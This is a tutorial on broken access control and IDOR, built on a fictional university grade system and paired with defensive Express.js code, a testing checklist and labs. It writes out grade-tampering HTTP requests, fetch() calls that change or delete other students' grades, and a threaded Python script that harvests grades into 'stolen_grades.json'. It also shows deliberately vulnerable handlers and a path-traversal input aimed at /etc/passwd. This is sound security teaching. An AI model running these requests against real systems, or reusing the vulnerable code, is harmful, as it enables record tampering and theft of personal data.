# Broken Access Control: Complete Practical Guide

## Table of Contents
- [Introduction](#introduction)
- [Core Concepts](#core-concepts)
- [Real-World Attack Scenario](#real-world-attack-scenario)
- [Exploitation Techniques](#exploitation-techniques)
- [IDOR Deep Dive](#idor-deep-dive)
- [Code Analysis](#code-analysis)
- [Defense Strategies](#defense-strategies)
- [Practical Labs](#practical-labs)
- [Advanced Topics](#advanced-topics)

---

## Introduction

### What is Broken Access Control?

Access control is the enforcement mechanism that determines what authenticated users are allowed to do within an application. It defines:

- **Horizontal Access Control**: Users can only access their own resources
- **Vertical Access Control**: Users can only access functions appropriate to their role
- **Context-Dependent Access Control**: Access based on application state or business logic

**Broken Access Control** occurs when these enforcement mechanisms fail, allowing unauthorized access to:
- Administrative functions
- Other users' data
- Restricted resources
- Sensitive operations

### OWASP Top 10 - #1 Position

In 2021, Broken Access Control claimed the top spot in the OWASP Top 10, surpassing injection vulnerabilities. This shift reflects:

- **94% of applications** tested had some form of broken access control
- **Average incidence rate**: 3.81%
- **318k+ occurrences** in the dataset
- **34 Common Weakness Enumerations (CWEs)** mapped to this category

---

## Core Concepts

### Authentication vs Authorization

| Aspect | Authentication | Authorization |
|--------|---------------|---------------|
| **Question** | Who are you? | What can you do? |
| **Purpose** | Verify identity | Enforce permissions |
| **Mechanism** | Credentials, tokens, biometrics | Roles, policies, ACLs |
| **Example** | Login with username/password | Admin can delete users |
| **Failure** | Impersonation | Privilege escalation |

**Critical Note**: Broken access control is an **authorization** vulnerability, not authentication.

### Types of Access Control Failures

#### 1. Vertical Privilege Escalation
Users gain access to functions reserved for higher-privileged roles.

```
Student → Teacher privileges
User → Administrator privileges
```

#### 2. Horizontal Privilege Escalation
Users access resources belonging to other users at the same privilege level.

```
User A → User B's data
Student 1 → Student 2's grades
```

#### 3. Context-Dependent Failures
Access granted without considering application state.

```
Editing orders after checkout
Modifying locked records
Bypassing workflow steps
```

---

## Real-World Attack Scenario

### The Setup

**Target**: University Grade Management System  
**URL**: `https://grades.patch.edu`  
**Attacker**: Ezra (Student ID: 20223948)  
**Motivation**: Failed Statistics exam, needs to pass to graduate  
**Objective**: Change grade from F to HD (High Distinction)

### Initial Reconnaissance

1. **Login to the portal**
   - Username: ezra@student.edu
   - Password: ********
   - Session established

2. **Navigate to grades page**
   - URL: `https://grades.patch.edu/student/dashboard`
   - Statistics grade shows: **F (Fail)**

3. **Inspect network traffic**
   - Open DevTools (F12) → Network tab
   - Observe API calls

### Intercepted Request

```http
GET /api/grades?studentid=20223948&subjectid=1293 HTTP/2
Host: api.grades.patch.edu
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Authorization: Bearer eyJzdHVkZW50X2lkIjoiMjAyMjM5NDgiLCJyb2xlIjoic3R1ZGVudCJ9
User-Agent: Mozilla/5.0
Accept: application/json
```

**Response:**
```json
{
  "studentId": "20223948",
  "studentName": "Ezra",
  "subjectId": "1293",
  "subjectName": "Statistics",
  "grade": "F",
  "credits": 6
}
```

---

## Exploitation Techniques

### Step 1: Identify Update Endpoint

Even though the UI doesn't show an "Edit Grade" button, the API might support it. Test common HTTP methods:

```http
OPTIONS /api/grades HTTP/2
Host: api.grades.patch.edu
```

**Response:**
```http
HTTP/2 200 OK
Allow: GET, POST, PATCH, DELETE
```

### Step 2: Craft Malicious Request

```http
PATCH /api/grades HTTP/2
Host: api.grades.patch.edu
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Authorization: Bearer eyJzdHVkZW50X2lkIjoiMjAyMjM5NDgiLCJyb2xlIjoic3R1ZGVudCJ9
Content-Type: application/json
Content-Length: 78

{
  "studentId": "20223948",
  "subjectId": "1293",
  "grade": "HD"
}
```

### Step 3: Analyze Response

**Vulnerable System:**
```json
{
  "success": true,
  "message": "Grade updated successfully",
  "newGrade": "HD"
}
```

**Secure System:**
```json
{
  "success": false,
  "error": "Access Denied: Insufficient permissions",
  "code": 403
}
```

### Step 4: Verify Exploitation

Refresh the grades page or send another GET request:

```http
GET /api/grades?studentid=20223948&subjectid=1293 HTTP/2
```

**Response:**
```json
{
  "studentId": "20223948",
  "studentName": "Ezra",
  "subjectId": "1293",
  "subjectName": "Statistics",
  "grade": "HD",
  "credits": 6
}
```

**Result**: Grade successfully changed from F to HD! 🎯

---

## IDOR Deep Dive

### What is IDOR?

**Insecure Direct Object Reference (IDOR)** occurs when an application exposes direct references to internal implementation objects (database keys, filenames, etc.) without proper authorization checks.

### IDOR in the Grade System

#### Viewing Other Students' Grades

**Your request:**
```http
GET /api/grades?studentid=20223948&subjectid=1293 HTTP/2
```

**Modified request:**
```http
GET /api/grades?studentid=20223949&subjectid=1293 HTTP/2
```

If successful, you've accessed another student's data!

### Mass Data Exfiltration

#### Python Script for Automated IDOR

```python
import requests
import json
from concurrent.futures import ThreadPoolExecutor

BASE_URL = "https://api.grades.patch.edu/api/grades"
SESSION_COOKIE = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
SUBJECT_ID = "1293"

def fetch_grade(student_id):
    """Fetch grade for a specific student ID"""
    try:
        response = requests.get(
            BASE_URL,
            params={"studentid": student_id, "subjectid": SUBJECT_ID},
            cookies={"session": SESSION_COOKIE},
            timeout=5
        )
        
        if response.status_code == 200:
            data = response.json()
            return {
                "student_id": student_id,
                "name": data.get("studentName"),
                "grade": data.get("grade")
            }
    except Exception as e:
        return None

def main():
    # Range of student IDs to test
    start_id = 20223000
    end_id = 20224000
    
    results = []
    
    # Use threading for faster execution
    with ThreadPoolExecutor(max_workers=10) as executor:
        student_ids = range(start_id, end_id)
        grades = executor.map(fetch_grade, student_ids)
        
        for grade_data in grades:
            if grade_data:
                results.append(grade_data)
                print(f"[+] Student {grade_data['student_id']}: "
                      f"{grade_data['name']} - Grade: {grade_data['grade']}")
    
    # Save results
    with open("stolen_grades.json", "w") as f:
        json.dump(results, f, indent=2)
    
    print(f"\n[*] Total records extracted: {len(results)}")

if __name__ == "__main__":
    main()
```

**Output:**
```
[+] Student 20223000: Alice Johnson - Grade: A
[+] Student 20223001: Bob Smith - Grade: B
[+] Student 20223002: Carol White - Grade: C
...
[*] Total records extracted: 847
```

### IDOR Variations

#### 1. Sequential IDs
```
/api/user/1234
/api/user/1235
/api/user/1236
```

#### 2. GUIDs (Still vulnerable!)
```
/api/document/a1b2c3d4-e5f6-7890-abcd-ef1234567890
```

#### 3. Encoded References
```
/api/profile/base64:MTIzNDU2  (decodes to 123456)
/api/file/hash:5d41402abc4b2a76b9719d911017c592
```


---

## Code Analysis

### Vulnerable Implementation

#### Backend API (Node.js/Express)

```javascript
const express = require('express');
const app = express();
const db = require('./database');

app.use(express.json());

// VULNERABLE: No access control on GET
app.get('/api/grades', async (req, res) => {
    const { studentid, subjectid } = req.query;
    
    // Direct database query without authorization check
    const result = await db.query(
        'SELECT * FROM grades WHERE student_id = ? AND subject_id = ?',
        [studentid, subjectid]
    );
    
    if (result.length > 0) {
        res.json(result[0]);
    } else {
        res.status(404).json({ error: 'Grade not found' });
    }
});

// VULNERABLE: No role-based access control on PATCH
app.patch('/api/grades', async (req, res) => {
    const { studentId, subjectId, grade } = req.body;
    
    // Anyone can update any grade!
    await db.query(
        'UPDATE grades SET grade = ? WHERE student_id = ? AND subject_id = ?',
        [grade, studentId, subjectId]
    );
    
    res.json({ success: true, message: 'Grade updated successfully' });
});

// VULNERABLE: No access control on DELETE
app.delete('/api/grades', async (req, res) => {
    const { studentid, subjectid } = req.query;
    
    await db.query(
        'DELETE FROM grades WHERE student_id = ? AND subject_id = ?',
        [studentid, subjectid]
    );
    
    res.json({ success: true, message: 'Grade deleted' });
});

app.listen(3000);
```

#### Why This is Vulnerable

1. **No authentication verification**: Doesn't check if user is logged in
2. **No authorization checks**: Doesn't verify user permissions
3. **No ownership validation**: Doesn't confirm user owns the resource
4. **No role verification**: Doesn't check if user has required role
5. **Direct object reference**: Uses user-supplied IDs directly

### Attack Vectors

```javascript
// Attack 1: View any student's grades
fetch('/api/grades?studentid=99999&subjectid=1293')

// Attack 2: Modify own grades
fetch('/api/grades', {
    method: 'PATCH',
    body: JSON.stringify({
        studentId: '20223948',
        subjectId: '1293',
        grade: 'HD'
    })
})

// Attack 3: Modify other students' grades
fetch('/api/grades', {
    method: 'PATCH',
    body: JSON.stringify({
        studentId: '20223949',
        subjectId: '1293',
        grade: 'F'
    })
})

// Attack 4: Delete grades
fetch('/api/grades?studentid=20223949&subjectid=1293', {
    method: 'DELETE'
})
```

---

## Defense Strategies

### 1. Implement Authentication Middleware

```javascript
const jwt = require('jsonwebtoken');

function authenticateToken(req, res, next) {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    
    if (!token) {
        return res.status(401).json({ error: 'Authentication required' });
    }
    
    jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
        if (err) {
            return res.status(403).json({ error: 'Invalid token' });
        }
        req.user = user;
        next();
    });
}
```

### 2. Implement Authorization Checks

```javascript
// Middleware to check resource ownership
function authorizeResourceAccess(req, res, next) {
    const requestedStudentId = req.query.studentid || req.body.studentId;
    const currentUser = req.user;
    
    // Allow if user is accessing their own data
    if (currentUser.id === requestedStudentId) {
        return next();
    }
    
    // Allow if user is a teacher or admin
    if (['teacher', 'admin'].includes(currentUser.role)) {
        return next();
    }
    
    // Deny access
    return res.status(403).json({ 
        error: 'Access Denied: You do not have permission to access this resource' 
    });
}

// Middleware to check role-based permissions
function requireRole(allowedRoles) {
    return (req, res, next) => {
        const userRole = req.user.role;
        
        if (!allowedRoles.includes(userRole)) {
            return res.status(403).json({ 
                error: `Access Denied: ${userRole} role cannot perform this action` 
            });
        }
        
        next();
    };
}
```

### 3. Secure Implementation

```javascript
// SECURE: Protected GET endpoint
app.get('/api/grades', 
    authenticateToken,
    authorizeResourceAccess,
    async (req, res) => {
        const { studentid, subjectid } = req.query;
        
        const result = await db.query(
            'SELECT * FROM grades WHERE student_id = ? AND subject_id = ?',
            [studentid, subjectid]
        );
        
        if (result.length > 0) {
            res.json(result[0]);
        } else {
            res.status(404).json({ error: 'Grade not found' });
        }
    }
);

// SECURE: Only teachers can update grades
app.patch('/api/grades',
    authenticateToken,
    requireRole(['teacher', 'admin']),
    async (req, res) => {
        const { studentId, subjectId, grade } = req.body;
        
        // Validate grade value
        const validGrades = ['HD', 'D', 'C', 'P', 'F'];
        if (!validGrades.includes(grade)) {
            return res.status(400).json({ error: 'Invalid grade value' });
        }
        
        // Log the action for audit trail
        await db.query(
            'INSERT INTO audit_log (teacher_id, student_id, subject_id, action, timestamp) VALUES (?, ?, ?, ?, NOW())',
            [req.user.id, studentId, subjectId, `Changed grade to ${grade}`]
        );
        
        await db.query(
            'UPDATE grades SET grade = ?, updated_by = ?, updated_at = NOW() WHERE student_id = ? AND subject_id = ?',
            [grade, req.user.id, studentId, subjectId]
        );
        
        res.json({ success: true, message: 'Grade updated successfully' });
    }
);

// SECURE: Only admins can delete grades
app.delete('/api/grades',
    authenticateToken,
    requireRole(['admin']),
    async (req, res) => {
        const { studentid, subjectid } = req.query;
        
        // Log deletion for audit
        await db.query(
            'INSERT INTO audit_log (admin_id, student_id, subject_id, action, timestamp) VALUES (?, ?, ?, ?, NOW())',
            [req.user.id, studentid, subjectid, 'Deleted grade']
        );
        
        await db.query(
            'DELETE FROM grades WHERE student_id = ? AND subject_id = ?',
            [studentid, subjectid]
        );
        
        res.json({ success: true, message: 'Grade deleted' });
    }
);
```

### 4. Additional Security Layers

```javascript
// Rate limiting to prevent brute force IDOR attacks
const rateLimit = require('express-rate-limit');

const apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // Limit each IP to 100 requests per windowMs
    message: 'Too many requests, please try again later'
});

app.use('/api/', apiLimiter);

// Input validation
const { body, query, validationResult } = require('express-validator');

app.get('/api/grades',
    authenticateToken,
    query('studentid').isNumeric().isLength({ min: 8, max: 8 }),
    query('subjectid').isNumeric().isLength({ min: 4, max: 4 }),
    (req, res, next) => {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            return res.status(400).json({ errors: errors.array() });
        }
        next();
    },
    authorizeResourceAccess,
    async (req, res) => {
        // Handler code...
    }
);
```

---

## Practical Labs

Hands-on labs are available in the `labs/grade-system/` directory.

### Lab Overview

| Lab | Description | Location |
|-----|-------------|----------|
| **Lab 1** | Vulnerable Grade System Setup | [`labs/grade-system/`](labs/grade-system/) |
| **Lab 2** | Exploitation Testing (IDOR, Privilege Escalation) | [`labs/grade-system/`](labs/grade-system/) |
| **Lab 3** | Secure Implementation (JWT + RBAC) | [`labs/grade-system/`](labs/grade-system/) |

### Quick Start

```bash
cd labs/grade-system
npm install
npm run init-db
npm start  # Run vulnerable server
```

See [`labs/grade-system/README.md`](labs/grade-system/README.md) for detailed instructions.

---

## Advanced Topics

### 1. Function-Level Access Control

Some applications fail to enforce access control at the function level:

```javascript
// VULNERABLE: Client-side only restriction
function deleteUser(userId) {
    // UI only shows this button to admins
    // But the API endpoint has no checks!
    fetch(`/api/users/${userId}`, { method: 'DELETE' });
}

// SECURE: Server-side enforcement
app.delete('/api/users/:id',
    authenticateToken,
    requireRole(['admin']),
    async (req, res) => {
        // Delete user logic
    }
);
```

### 2. Parameter Tampering

Attackers modify parameters to escalate privileges:

```javascript
// VULNERABLE: Trusting client-supplied role
app.post('/api/register', async (req, res) => {
    const { name, email, password, role } = req.body;
    // Attacker can set role to 'admin'!
    await createUser(name, email, password, role);
});

// SECURE: Server determines role
app.post('/api/register', async (req, res) => {
    const { name, email, password } = req.body;
    // Always set new users as 'student'
    await createUser(name, email, password, 'student');
});
```

### 3. Mass Assignment Vulnerabilities

```javascript
// VULNERABLE: Accepting all fields
app.patch('/api/profile', authenticateToken, async (req, res) => {
    // Attacker can include 'role' or 'isAdmin' in request body
    await db.query('UPDATE users SET ? WHERE id = ?', [req.body, req.user.id]);
});

// SECURE: Whitelist allowed fields
app.patch('/api/profile', authenticateToken, async (req, res) => {
    const allowedFields = ['name', 'email', 'phone'];
    const updates = {};
    
    allowedFields.forEach(field => {
        if (req.body[field] !== undefined) {
            updates[field] = req.body[field];
        }
    });
    
    await db.query('UPDATE users SET ? WHERE id = ?', [updates, req.user.id]);
});
```

### 4. JWT Token Manipulation

```javascript
// VULNERABLE: Not verifying token signature
function decodeToken(token) {
    // Just decoding without verification!
    return jwt.decode(token);
}

// SECURE: Always verify signature
function verifyToken(token) {
    try {
        return jwt.verify(token, JWT_SECRET);
    } catch (err) {
        throw new Error('Invalid token');
    }
}
```

### 5. Path Traversal in Access Control

```javascript
// VULNERABLE: No path validation
app.get('/api/files/:filename', authenticateToken, async (req, res) => {
    const userDir = `/files/${req.user.id}/`;
    const filePath = userDir + req.params.filename;
    // Attacker can use: ../../../etc/passwd
    res.sendFile(filePath);
});

// SECURE: Validate and sanitize paths
const path = require('path');

app.get('/api/files/:filename', authenticateToken, async (req, res) => {
    const userDir = path.join(__dirname, 'files', req.user.id);
    const filename = path.basename(req.params.filename); // Remove path components
    const filePath = path.join(userDir, filename);
    
    // Ensure file is within user directory
    if (!filePath.startsWith(userDir)) {
        return res.status(403).json({ error: 'Access Denied' });
    }
    
    res.sendFile(filePath);
});
```

### 6. Multi-Tenant Access Control

```javascript
// VULNERABLE: No tenant isolation
app.get('/api/documents/:id', authenticateToken, async (req, res) => {
    const doc = await db.query('SELECT * FROM documents WHERE id = ?', [req.params.id]);
    res.json(doc);
});

// SECURE: Enforce tenant boundaries
app.get('/api/documents/:id', authenticateToken, async (req, res) => {
    const doc = await db.query(
        'SELECT * FROM documents WHERE id = ? AND tenant_id = ?',
        [req.params.id, req.user.tenantId]
    );
    
    if (!doc) {
        return res.status(404).json({ error: 'Document not found' });
    }
    
    res.json(doc);
});
```

---

## Testing Checklist

### Manual Testing

- [ ] Test accessing resources with different user accounts
- [ ] Try modifying IDs in URLs and request bodies
- [ ] Test with missing authentication tokens
- [ ] Attempt to access admin functions as regular user
- [ ] Try accessing other users' data
- [ ] Test with expired or invalid tokens
- [ ] Modify role/permission parameters in requests
- [ ] Test API endpoints directly (bypass UI)
- [ ] Check for forced browsing vulnerabilities
- [ ] Test with sequential ID enumeration

### Automated Testing

```python
# access_control_scanner.py
import requests

class AccessControlScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.vulnerabilities = []
    
    def test_idor(self, endpoint, id_param, token):
        """Test for IDOR vulnerabilities"""
        print(f"[*] Testing IDOR on {endpoint}")
        
        for test_id in range(1, 100):
            url = f"{self.base_url}{endpoint}?{id_param}={test_id}"
            response = requests.get(url, headers={"Authorization": f"Bearer {token}"})
            
            if response.status_code == 200:
                self.vulnerabilities.append({
                    "type": "IDOR",
                    "endpoint": endpoint,
                    "id": test_id,
                    "severity": "High"
                })
    
    def test_privilege_escalation(self, endpoint, methods, student_token):
        """Test for vertical privilege escalation"""
        print(f"[*] Testing privilege escalation on {endpoint}")
        
        for method in methods:
            response = requests.request(
                method,
                f"{self.base_url}{endpoint}",
                headers={"Authorization": f"Bearer {student_token}"}
            )
            
            if response.status_code not in [401, 403]:
                self.vulnerabilities.append({
                    "type": "Privilege Escalation",
                    "endpoint": endpoint,
                    "method": method,
                    "severity": "Critical"
                })
    
    def generate_report(self):
        """Generate vulnerability report"""
        print("\n=== Vulnerability Report ===")
        for vuln in self.vulnerabilities:
            print(f"[{vuln['severity']}] {vuln['type']} - {vuln['endpoint']}")

# Usage
scanner = AccessControlScanner("http://localhost:3000")
scanner.test_idor("/api/grades", "studentid", "student_token_here")
scanner.test_privilege_escalation("/api/grades", ["PATCH", "DELETE"], "student_token_here")
scanner.generate_report()
```

---

## Real-World Examples

### Case Study 1: Facebook IDOR (2013)
**Vulnerability**: Users could view private photos by manipulating photo IDs  
**Impact**: Exposure of private user photos  
**Bounty**: $12,500

### Case Study 2: Instagram IDOR (2015)
**Vulnerability**: Deleting any photo by changing photo ID in API request  
**Impact**: Ability to delete any user's photos  
**Bounty**: $10,000

### Case Study 3: Uber Admin Panel (2016)
**Vulnerability**: Accessing admin panel without proper authorization  
**Impact**: Full access to rider/driver data  
**Bounty**: $10,000

### Case Study 4: USPS Informed Visibility (2018)
**Vulnerability**: IDOR allowing access to 60 million users' data  
**Impact**: Massive data breach  
**Outcome**: Public disclosure and system shutdown

---

## Prevention Best Practices

### 1. Deny by Default
```javascript
// Default to denying access
function checkAccess(user, resource, action) {
    // Explicitly grant access only when conditions are met
    if (hasPermission(user, resource, action)) {
        return true;
    }
    return false; // Deny everything else
}
```

### 2. Use Indirect References
```javascript
// Instead of exposing database IDs
// BAD: /api/document/12345

// Use session-based mapping
// GOOD: /api/document/current
const userDocuments = req.session.documents; // [12345, 67890]
const docId = userDocuments[0];
```

### 3. Implement Audit Logging
```javascript
function logAccess(userId, resource, action, result) {
    db.query(
        'INSERT INTO access_log (user_id, resource, action, result, timestamp) VALUES (?, ?, ?, ?, NOW())',
        [userId, resource, action, result]
    );
}
```

### 4. Regular Security Reviews
- Code reviews focusing on authorization
- Penetration testing
- Automated security scanning
- Access control matrix documentation

### 5. Framework-Level Controls
```javascript
// Use established frameworks
const { authorize } = require('express-authorization');

app.get('/api/grades',
    authenticate,
    authorize('grades:read:own'),
    handler
);
```

---

## Tools for Testing

### 1. Burp Suite
- Intercept and modify requests
- Automated scanning
- Intruder for parameter fuzzing

### 2. OWASP ZAP
- Free alternative to Burp
- Active and passive scanning
- API testing capabilities

### 3. Postman
- API testing
- Collection runner for automation
- Environment variables for different users

### 4. Custom Scripts
```python
# Simple IDOR tester
import requests

def test_idor(base_url, endpoint, param, values, token):
    for value in values:
        url = f"{base_url}{endpoint}?{param}={value}"
        r = requests.get(url, headers={"Authorization": f"Bearer {token}"})
        print(f"{value}: {r.status_code}")
```

---

## Key Takeaways

1. **Access control must be enforced server-side** - Never trust client-side restrictions
2. **Implement both authentication and authorization** - Knowing who someone is isn't enough
3. **Use role-based access control (RBAC)** - Define clear permission structures
4. **Validate resource ownership** - Users should only access their own data
5. **Deny by default** - Explicitly grant access rather than blocking specific cases
6. **Log all access attempts** - Maintain audit trails for security monitoring
7. **Test thoroughly** - Use both manual and automated testing
8. **Use indirect references** - Don't expose internal object IDs when possible
9. **Regular security reviews** - Access control requirements change over time
10. **Framework support** - Leverage established authorization frameworks

---

## Additional Resources

### Documentation
- [OWASP Top 10 - A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [OWASP Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)
- [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)
- [Snyk Learn - Broken Access Control](https://learn.snyk.io/lesson/broken-access-control)

### Practice Platforms
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/access-control)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)

### Books
- "The Web Application Hacker's Handbook" by Dafydd Stuttard
- "OWASP Testing Guide v4"
- "Web Security Testing Cookbook" by Paco Hope

### Bug Bounty Programs
- [HackerOne](https://www.hackerone.com/)
- [Bugcrowd](https://www.bugcrowd.com/)
- [Synack](https://www.synack.com/)

---

## Conclusion

Broken access control remains the #1 web application security risk. Understanding how these vulnerabilities work and how to prevent them is crucial for any developer or security professional. 

**Remember**: This knowledge is for educational and defensive purposes only. Always obtain proper authorization before testing systems you don't own.

---

**Last Updated**: 2026-02-24 
**Author**: [Samson Tesfaye](https://github.com/haxurn)
**License**: Educational Use Only
